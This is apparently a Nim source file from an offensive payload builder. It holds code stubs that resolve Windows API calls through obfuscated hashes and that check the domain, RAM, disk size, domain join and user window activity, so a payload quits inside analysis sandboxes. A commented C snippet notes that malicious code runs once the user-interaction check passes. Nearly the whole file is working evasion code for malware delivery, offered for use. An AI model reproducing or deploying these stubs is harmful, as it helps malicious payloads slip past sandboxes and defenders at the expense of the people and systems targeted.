
let DInvokeSandBoxStub * = """



type
  GetComputerNameExA_t* = proc (nameType: cint, name: cstring, len: PDWORD): WINBOOL {.stdcall.}
  GlobalMemoryStatusEx_t* = proc (lpBuffer: LPMEMORYSTATUSEX): WINBOOL {.stdcall.}
  GetDiskFreeSpaceExA_t* = proc (lpDirectoryName: LPCSTR, lpFreeBytesAvailableToCaller: PULARGE_INTEGER, lpTotalNumberOfBytes: PULARGE_INTEGER, lpTotalNumberOfFreeBytes: PULARGE_INTEGER): WINBOOL {.stdcall.}

const
  GetComputerNameExA_HASH * = obf("GetComputerNameExA")
  GlobalMemoryStatusEx_HASH * = obf("GlobalMemoryStatusEx")
  GetDiskFreeSpaceExA_HASH * = obf("GetDiskFreeSpaceExA")

var MyGetComputerNameExA*: GetComputerNameExA_t
var MyGlobalMemoryStatusEx*: GlobalMemoryStatusEx_t
var MyGetDiskFreeSpaceExA*: GetDiskFreeSpaceExA_t

MyGetComputerNameExA = cast[GetComputerNameExA_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), GetComputerNameExA_HASH, 0, FALSE)))

MyGlobalMemoryStatusEx = cast[GlobalMemoryStatusEx_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), GlobalMemoryStatusEx_HASH, 0, FALSE)))

MyGetDiskFreeSpaceExA = cast[GetDiskFreeSpaceExA_t](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), GetDiskFreeSpaceExA_HASH, 0, FALSE))


"""

let DomainCheckStub * = """

# code modified from here -> https://github.com/rominf/nim-hostname/blob/d517210adedf7f6c708393ddd20fd7a93504f262/src/hostname.nim
when defined(windows):
  # https://docs.microsoft.com/en-us/windows/win32/api/sysinfoapi/ne-sysinfoapi-computer_name_format
  const ComputerNameDnsDomain = 2
  # For testing purposes only
  const ComputerNameDnsFullyQualified = 3
elif defined(posix):
  import posix

proc getDomain*(): string =
  ## Returns domain name only.
  ## On Windows (see
  ## https://docs.microsoft.com/en-us/windows/win32/sysinfo/computer-names)
  ## returns ComputerNamePhysicalDnsHostname.
  # On POSIX SUSv2 guarantees that "Host names are limited to 255 bytes".
  # https://tools.ietf.org/html/rfc1035#section-2.3.1
  # https://tools.ietf.org/html/rfc2181#section-11
  const size = 256
  result = newString(size)
  when defined(windows):
    var resultLen: DWORD = DWORD(size)
    when defined(DInvoke):
        let success = MyGetComputerNameExA(ComputerNameDnsDomain,result.cstring, resultLen.addr) != 0
    else:
        let success = GetComputerNameExA(ComputerNameDnsDomain,result.cstring, resultLen.addr) != 0
  if not success:
      echo obf("Failed to get Domain")
  result.setLen(resultLen)

"""


let MemorySpaceStub * = """

from winim import GlobalMemoryStatusEx,DWORD,MEMORYSTATUSEX

var statex: MEMORYSTATUSEX

proc MemoryCheck*(): bool =
    var gofurther: bool = false

    statex.dwLength = cast[DWORD](sizeof(statex))
    when defined(DInvoke):
        discard MyGlobalMemoryStatusEx(addr statex)
    else:
        discard GlobalMemoryStatusEx(addr statex)
    var totalPhys = float(statex.ullTotalPhys) / float(1024*1024*1024)
    # If more than 4GB RAM available return true
    if(totalPhys >= 3.8):
        gofurther = true
        return gofurther
    else:
        return gofurther

when isMainModule:
    if (MemoryCheck() == false):
        echo obf("Not enough memory")
        quit()

"""


let DiskSpaceStub * = """

from winim import GetDiskFreeSpaceEx,ULARGE_INTEGER,NTSTATUS
import winim/winstr

proc DiskSizeCheck*(): bool =

    var
        uliUserFree: ULARGE_INTEGER
        uliTotal: ULARGE_INTEGER
        uliRealFree: ULARGE_INTEGER
        success: NTSTATUS
        result: float
        gofurther: bool

    when defined(DInvoke):
        success = MyGetDiskFreeSpaceExA("C:\\",addr uliUserFree, addr uliTotal, addr uliRealFree)
    else:
        success = GetDiskFreeSpaceEx("C:\\",addr uliUserFree, addr uliTotal, addr uliRealFree)
    result = float(uliTotal.QuadPart) / float((1024*1024*1024))
    #echo "Size in GB: " & $result
    if(result >= 200):
        gofurther = true
        return gofurther
    else:
        return gofurther

when isMainModule:
    if (DiskSizeCheck() == false):
        echo obf("Disk too small")
        quit()

"""
#[

    ToDo: 
The idea is that the application is waiting for the foreground window title to change x amount of time before continuing execution.

Aka if a human is interacting with the system it will eventually run the code. You can have a big delay is you set the MIN_COUNT to a big number like 1000. I personally use between 10 and 20.

        
#include <windows.h>
#include <stdio.h>

#define MIN_COUNT 10

CHAR current[256];

int main() {
        DWORD passed = 0;
        memset(current, 0x00, 256);

        while(passed < MIN_COUNT) {
                HWND hwnd = GetForegroundWindow();
                CHAR *title = (CHAR*)GlobalAlloc(GPTR, 256);
                GetWindowTextA(hwnd, title, 256);
                if(strcmp(title, current) == 0) {
                        strncpy(current, title, 256);
                        passed++;
                }
                GlobalFree(title);
        }

        // You passed the user interaction check at this point code execute malicious code

        return 0;
}

]#


let DomainJoinStub * = """
# This will check for ANY domain join
from winim/com import GetObject
try:
    discard GetObject(obf("LDAP://RootDSE"))
except:
    quit()
finally:
    echo ""
"""